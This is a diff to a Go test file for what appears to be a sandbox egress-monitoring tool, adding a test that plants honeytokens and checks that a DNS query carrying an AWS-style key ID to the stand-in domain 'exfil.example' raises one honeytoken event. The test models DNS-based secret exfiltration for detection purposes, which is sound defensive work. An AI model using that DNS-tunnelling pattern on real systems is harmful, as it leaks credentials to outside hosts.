@@ -15,6 +15,7 @@ import (
 	"golang.org/x/net/dns/dnsmessage"
 
 	"github.com/Frostykiller3m/Quaarant/internal/events"
+	"github.com/Frostykiller3m/Quaarant/internal/honeytoken"
 )
 
 func TestRulesNormalize(t *testing.T) {
@@ -233,5 +234,34 @@ func TestErrorsAreDenials(t *testing.T) {
 	var d *Denial
 	if !errors.As(err, &d) || d.Reason != "direct_ip" || !strings.Contains(err.Error(), "1.1.1.1:443") {
 		t.Error(err)
+	}
+}
+
+func TestHoneyInDNS(t *testing.T) {
+	set, err := honeytoken.Generate("/tmp")
+	if err != nil {
+		t.Fatal(err)
+	}
+	rec := &recorded{}
+	r, _ := Rules{Mode: ModeLog, Honey: honeytoken.NewMatcher(set)}.Normalize()
+	p := newSandboxPolicy("sb", r, rec.emit, testPool)
+	up := func(context.Context, dnsmessage.Name) ([]netip.Addr, uint32, dnsmessage.RCode, error) {
+		return nil, 0, dnsmessage.RCodeNameError, nil
+	}
+	akid := strings.ToLower(set.Tokens[1].Secrets[0])
+	p.answerDNS(context.Background(), query(t, akid+".exfil.example.", dnsmessage.TypeA), up, func() []netip.Addr { return nil })
+	p.answerDNS(context.Background(), query(t, akid+".exfil.example.", dnsmessage.TypeAAAA), up, func() []netip.Addr { return nil }) // the same sighting
+	p.answerDNS(context.Background(), query(t, "pypi.org.", dnsmessage.TypeA), up, func() []netip.Addr { return nil })
+	n := 0
+	for _, e := range rec.evs {
+		if h, ok := e.(events.Honeytoken); ok {
+			n++
+			if h.Trigger != "egress_dns" || h.TokenKind != honeytoken.KindAWS || !strings.HasPrefix(h.Dst, akid) {
+				t.Errorf("%+v", h)
+			}
+		}
+	}
+	if n != 1 {
+		t.Errorf("%d honeytoken events, want 1: %v", n, rec.kinds())
 	}
 }
